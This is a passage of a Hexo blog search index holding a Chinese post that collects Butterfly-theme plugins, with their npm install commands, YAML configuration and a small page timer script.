<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>butterfly引用各路大神的魔改项目</title>
      <link href="/posts/449edacf/"/>
      <url>/posts/449edacf/</url>
      
        <content type="html"><![CDATA[<h1 id="配置文章链接转数字或字母"><a href="#配置文章链接转数字或字母" class="headerlink" title="配置文章链接转数字或字母"></a>配置文章链接转数字或字母</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><h1 id="本地搜索依赖"><a href="#本地搜索依赖" class="headerlink" title="本地搜索依赖"></a>本地搜索依赖</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><h1 id="live2d-看板娘"><a href="#live2d-看板娘" class="headerlink" title="live2d-看板娘"></a>live2d-看板娘</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装live2d</span></span><br><span class="line">npm install --save hexo-helper-live2d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装模型</span></span><br><span class="line">npm install --save live2d-widget-model-koharu</span><br></pre></td></tr></table></figure><h1 id="添加-wowjs-特效"><a href="#添加-wowjs-特效" class="headerlink" title="添加 wowjs 特效"></a>添加 wowjs 特效</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-wowjs --save</span><br></pre></td></tr></table></figure><p>添加配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wowjs</span></span><br><span class="line"><span class="comment"># see https://www.npmjs.com/package/hexo-butterfly-wowjs</span></span><br><span class="line"><span class="attr">wowjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制动画开关。true是打开，false是关闭</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">10</span> <span class="comment">#过滤器优先级</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span> <span class="comment">#移动端是否启用，默认移动端禁用</span></span><br><span class="line">  <span class="attr">animateitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">recent-post-item</span> <span class="comment">#必填项，需要添加动画的元素的class</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__zoomIn</span> <span class="comment">#必填项，需要添加的动画</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="number">1.</span><span class="string">5s</span> <span class="comment">#选填项，动画持续时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="attr">delay:</span> <span class="string">200ms</span> <span class="comment">#选填项，动画开始的延迟时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="attr">offset:</span> <span class="number">30</span> <span class="comment">#选填项，开始动画的距离（相对浏览器底部）</span></span><br><span class="line">      <span class="attr">iteration:</span> <span class="number">1</span> <span class="comment">#选填项，动画重复的次数</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">card-widget</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__zoomIn</span></span><br><span class="line">      <span class="attr">delay:</span> <span class="string">200ms</span></span><br><span class="line">    <span class="comment"># - class: flink-list-card</span></span><br><span class="line">    <span class="comment">#   style: wowpanels</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">flink-list-card</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__flipInY</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="string">3s</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">flink-list-card</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__animated</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="string">3s</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">article-sort-item</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__slideInRight</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="number">1.</span><span class="string">5s</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">site-card</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__flipInY</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="string">3s</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">site-card</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__animated</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="string">3s</span></span><br><span class="line">  <span class="attr">animate_css:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css</span></span><br><span class="line">  <span class="attr">wow_js:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js</span></span><br><span class="line">  <span class="attr">wow_init_js:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js</span></span><br></pre></td></tr></table></figure><h1 id="留言板：薇尔莉特信封"><a href="#留言板：薇尔莉特信封" class="headerlink" title="留言板：薇尔莉特信封"></a>留言板：薇尔莉特信封</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-envelope --save</span><br></pre></td></tr></table></figure><p>添加配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># envelope_comment</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/e2d3c450/</span></span><br><span class="line"><span class="comment"># envelope_comment</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/e2d3c450/</span></span><br><span class="line"><span class="attr">envelope_comment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制开关</span></span><br><span class="line">  <span class="attr">custom_pic:</span></span><br><span class="line">    <span class="attr">cover:</span> <span class="string">https://cdn.cbd.int//hexo-butterfly-envelope/lib/violet.jpg</span> <span class="comment">#信笺头部图片</span></span><br><span class="line">    <span class="attr">line:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-envelope/lib/line.png</span> <span class="comment">#信笺底部图片</span></span><br><span class="line">    <span class="attr">beforeimg:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-envelope/lib/before.png</span> <span class="comment"># 信封前半部分</span></span><br><span class="line">    <span class="attr">afterimg:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-envelope/lib/after.png</span> <span class="comment"># 信封后半部分</span></span><br><span class="line">  <span class="attr">message:</span> <span class="comment">#信笺正文，多行文本，写法如下</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想问的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想说的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想吐槽的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哪怕是有什么想吃的，都可以告诉我哦~</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="string">自动书记人偶竭诚为您服务！</span> <span class="comment">#仅支持单行文本</span></span><br><span class="line">  <span class="attr">height:</span> <span class="comment">#1050px，信封划出的高度</span></span><br><span class="line">  <span class="attr">path:</span> <span class="comment">#【可选】comments 的路径名称。默认为 comments，生成的页面为 comments/index.html</span></span><br><span class="line">  <span class="attr">front_matter:</span> <span class="comment">#【可选】comments页面的 front_matter 配置</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">留言板</span></span><br><span class="line">    <span class="attr">comments:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">new</span> <span class="string">留言板</span></span><br></pre></td></tr></table></figure><p>配置_config.butterfly.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">留言板:</span> <span class="string">/comments/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-envelope</span></span><br></pre></td></tr></table></figure><h1 id="页脚-github-徽标和计时器"><a href="#页脚-github-徽标和计时器" class="headerlink" title="页脚 github 徽标和计时器"></a>页脚 github 徽标和计时器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-footer-beautify --save</span><br></pre></td></tr></table></figure><p>添加配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># footer_beautify</span></span><br><span class="line"><span class="comment"># 页脚计时器：[Native JS Timer](https://akilar.top/posts/b941af/)</span></span><br><span class="line"><span class="comment"># 页脚徽标：[Add Github Badge](https://akilar.top/posts/e87ad7f8/)</span></span><br><span class="line"><span class="attr">footer_beautify:</span></span><br><span class="line">  <span class="attr">enable:</span></span><br><span class="line">    <span class="attr">timer:</span> <span class="literal">true</span> <span class="comment"># 计时器开关</span></span><br><span class="line">    <span class="attr">bdage:</span> <span class="literal">true</span> <span class="comment"># 徽标开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="comment"># - /posts/</span></span><br><span class="line">    <span class="comment"># - /about/</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">footer-wrap</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment"># 计时器部分配置项</span></span><br><span class="line">  <span class="attr">runtime_js:</span> <span class="string">/js/runtime.min.js</span></span><br><span class="line">  <span class="attr">runtime_css:</span> <span class="string">/css/runtime.min.css</span></span><br><span class="line">  <span class="comment"># 徽标部分配置项</span></span><br><span class="line">  <span class="attr">swiperpara:</span> <span class="number">0</span> <span class="comment">#若非0，则开启轮播功能，每行徽标个数</span></span><br><span class="line">  <span class="attr">bdageitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://hexo.io/</span> <span class="comment">#徽标指向网站链接</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo</span> <span class="comment">#徽标API</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">博客框架为Hexo_v5.4.0</span> <span class="comment">#徽标提示语</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://butterfly.js.org/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">主题版本Butterfly_v4.2.2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://www.jsdelivr.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站使用JsDelivr为静态资源提供CDN加速</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">https://github.com/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站项目由Github托管</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">link:</span> <span class="string">http://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br><span class="line">      <span class="attr">shields:</span> <span class="string">https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可</span></span><br></pre></td></tr></table></figure><p>新建runtime.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>; <span class="keyword">function</span> <span class="title function_">createtime</span>(<span class="params"></span>) &#123; <span class="keyword">var</span> grt = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;08/10/2022 00:00:00&quot;</span>); now.<span class="title function_">setTime</span>(now.<span class="title function_">getTime</span>() + <span class="number">250</span>); <span class="keyword">var</span> days = (now - grt) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>, dnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(days), hours = (now - grt) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> - <span class="number">24</span> * dnum, hnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(hours); <span class="number">1</span> == <span class="title class_">String</span>(hnum).<span class="property">length</span> &amp;&amp; (hnum = <span class="string">&quot;0&quot;</span> + hnum); <span class="keyword">var</span> minutes = (now - grt) / <span class="number">1e3</span> / <span class="number">60</span> - <span class="number">1440</span> * dnum - <span class="number">60</span> * hnum, mnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(minutes); <span class="number">1</span> == <span class="title class_">String</span>(mnum).<span class="property">length</span> &amp;&amp; (mnum = <span class="string">&quot;0&quot;</span> + mnum); <span class="keyword">var</span> seconds = (now - grt) / <span class="number">1e3</span> - <span class="number">86400</span> * dnum - <span class="number">3600</span> * hnum - <span class="number">60</span> * mnum, snum = <span class="title class_">Math</span>.<span class="title function_">round</span>(seconds); <span class="number">1</span> == <span class="title class_">String</span>(snum).<span class="property">length</span> &amp;&amp; (snum = <span class="string">&quot;0&quot;</span> + snum); <span class="keyword">let</span> currentTimeHtml = <span class="string">&quot;&quot;</span>; currentTimeHtml = hnum &lt; <span class="number">19</span> &amp;&amp; hnum &gt;= <span class="number">10</span> ? <span class="string">`&lt;img class=&#x27;boardsign&#x27; src=&#x27;/img/小时-上班中.svg&#x27; title=&#x27;距离月入25k也就还差一个大佬带我~&#x27;&gt;&lt;span class=&#x27;textTip&#x27;&gt; &lt;br&gt; 本站居然运行了 <span class="subst">$&#123;dnum&#125;</span> 天&lt;/span&gt;&lt;span id=&#x27;runtime&#x27;&gt; <span class="subst">$&#123;hnum&#125;</span> 小时 <span class="subst">$&#123;mnum&#125;</span> 分 <span class="subst">$&#123;snum&#125;</span> 秒 &lt;/span&gt; &lt;i class=&#x27;fas fa-heartbeat&#x27; style=&#x27;color:red&#x27;&gt;&lt;/i&gt;`</span> : <span class="string">`&lt;img class=&#x27;boardsign&#x27; src=&#x27;/img/小时-下班啦.svg&#x27; title=&#x27;下班了就该开开心心的玩耍，嘿嘿~&#x27;&gt;&lt;span class=&#x27;textTip&#x27;&gt; &lt;br&gt; 本站居然运行了 <span class="subst">$&#123;dnum&#125;</span> 天&lt;/span&gt;&lt;span id=&#x27;runtime&#x27;&gt; <span class="subst">$&#123;hnum&#125;</span> 小时 <span class="subst">$&#123;mnum&#125;</span> 分 <span class="subst">$&#123;snum&#125;</span> 秒 &lt;/span&gt; &lt;i class=&#x27;fas fa-heartbeat&#x27; style=&#x27;color:red&#x27;&gt;&lt;/i&gt;`</span>, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>) &amp;&amp; (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>).<span class="property">innerHTML</span> = currentTimeHtml) &#125; <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123; <span class="title function_">createtime</span>() &#125;, <span class="number">250</span>);</span><br></pre></td></tr></table></figure><h1 id="电子钟"><a href="#电子钟" class="headerlink" title="电子钟"></a>电子钟</h1><p>作者链接：<a href="https://anzhiy.cn/posts/fc18.html">https://anzhiy.cn/posts/fc18.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-clock-anzhiyu --save</span><br></pre></td></tr></table></figure><p>添加配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># electric_clock</span></span><br><span class="line"><span class="comment"># see https://anzhiy.cn/posts/fc18.html</span></span><br><span class="line"><span class="attr">electric_clock:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="comment"># - /posts/</span></span><br><span class="line">    <span class="comment"># - /about/</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">class</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sticky_layout</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">loading:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif</span> <span class="comment">#加载动画自定义</span></span><br><span class="line">  <span class="attr">clock_css:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css</span></span><br><span class="line">  <span class="attr">clock_js:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js</span></span><br><span class="line">  <span class="attr">ip_api:</span> <span class="string">https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0</span></span><br><span class="line">  <span class="attr">qweather_key:</span> <span class="string">b18c3520777b4dca9156454d93b1bf74</span> <span class="comment"># 和风天气key</span></span><br><span class="line">  <span class="attr">gaud_map_key:</span> <span class="string">bd298238a112287da21d1305adab4aa6</span> <span class="comment"># 高得地图web服务key</span></span><br><span class="line">  <span class="attr">default_rectangle:</span> <span class="literal">false</span> <span class="comment"># 开启后将一直显示rectangle位置的天气，否则将获取访问者的地理位置与天气</span></span><br><span class="line">  <span class="attr">rectangle:</span> <span class="number">87.617733</span><span class="string">,43.792818</span> <span class="comment"># 获取访问者位置失败时会显示该位置的天气，同时该位置为开启default_rectangle后的位置</span></span><br></pre></td></tr></table></figure><h1 id="hexo-butterfly-swiper-anzhiyu-插件安装"><a href="#hexo-butterfly-swiper-anzhiyu-插件安装" class="headerlink" title="hexo-butterfly-swiper-anzhiyu 插件安装"></a>hexo-butterfly-swiper-anzhiyu 插件安装</h1><p>作者链接：<a href="https://anzhiy.cn/posts/sdxhu.html">https://anzhiy.cn/posts/sdxhu.html</a></p><div class="tabs" id="1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#1-1">安装依赖</button></li><li class="tab"><button type="button" data-href="#1-2">配置项</button></li><li class="tab"><button type="button" data-href="#1-3">pjax适配</button></li><li class="tab"><button type="button" data-href="#1-4">轮播图顺序控制</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="1-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-swiper-anzhiyu --save</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="1-2"><p>在<code>_config.butterfly.yml</code>加入以下配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-butterfly-swiper-anzhiyu</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/8e1264d1/</span></span><br><span class="line"><span class="attr">swiper:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">randomenable:</span> <span class="literal">true</span> <span class="comment"># 人潮汹涌开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">timemode:</span> <span class="string">date</span> <span class="comment">#date/updated</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">default_descr:</span> <span class="string">再怎么看我也不知道怎么描述它的啦！</span></span><br><span class="line">  <span class="attr">swiper_css:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-swiper-anzhiyu@1.0.4/lib/swiper.min.css</span> <span class="comment">#swiper css依赖</span></span><br><span class="line">  <span class="attr">swiper_js:</span> <span class="string">https://npm.elemecdn.com/anzhiyu-blog@1.1.6/js/swiper.min.js</span> <span class="comment">#swiper js依赖 #swiper js依赖</span></span><br><span class="line">  <span class="attr">custom_css:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-swiper-anzhiyu@1.0.4/lib/swiperstyle.css</span> <span class="comment"># 适配主题样式补丁</span></span><br><span class="line">  <span class="attr">custom_js:</span> <span class="string">https://cdn.cbd.int/hexo-butterfly-swiper-anzhiyu@1.0.4/lib/swiper_init.js</span> <span class="comment"># swiper初始化方法</span></span><br><span class="line">  <span class="attr">gsap_js:</span> <span class="string">https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/gsap/3.9.1/gsap.min.js</span></span><br><span class="line">  <span class="attr">people_js:</span> <span class="string">https://npm.elemecdn.com/hexo-butterfly-swiper-anzhiyu@1.0.4/lib/people.min.js</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="1-3"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pjax</span></span><br><span class="line"><span class="comment"># It may contain bugs and unstable, give feedback when you find the bugs.</span></span><br><span class="line"><span class="comment"># https://github.com/MoOx/pjax</span></span><br><span class="line"><span class="attr">pjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="comment"># - xxxx</span></span><br><span class="line">    <span class="comment"># - xxxx</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="1-4"><p>swiper_index: 1</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="hexo-butterfly-categories-card"><a href="#hexo-butterfly-categories-card" class="headerlink" title="hexo-butterfly-categories-card"></a>hexo-butterfly-categories-card</h1><div class="tabs" id="2"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2-1">安装依赖</button></li><li class="tab"><button type="button" data-href="#2-2">配置项</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-categories-card --save</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2-2"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-butterfly-categories-card</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/a9131002/</span></span><br><span class="line"><span class="attr">categoryBar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">6</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">column:</span> <span class="string">even</span> <span class="comment"># odd：3列 | even：4列</span></span><br><span class="line">  <span class="attr">row:</span> <span class="number">1</span> <span class="comment">#显示行数，默认两行，超过行数切换为滚动显示</span></span><br><span class="line">  <span class="attr">message:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">descr:</span> </span><br><span class="line">      <span class="attr">cover:</span> <span class="string">https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/22.PNG</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">descr:</span> </span><br><span class="line">      <span class="attr">cover:</span> <span class="string">https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/10.PNG</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">descr:</span> </span><br><span class="line">      <span class="attr">cover:</span> <span class="string">https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/16.PNG</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">descr:</span> </span><br><span class="line">      <span class="attr">cover:</span> <span class="string">https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/21.PNG</span></span><br><span class="line">  <span class="attr">custom_css:</span> <span 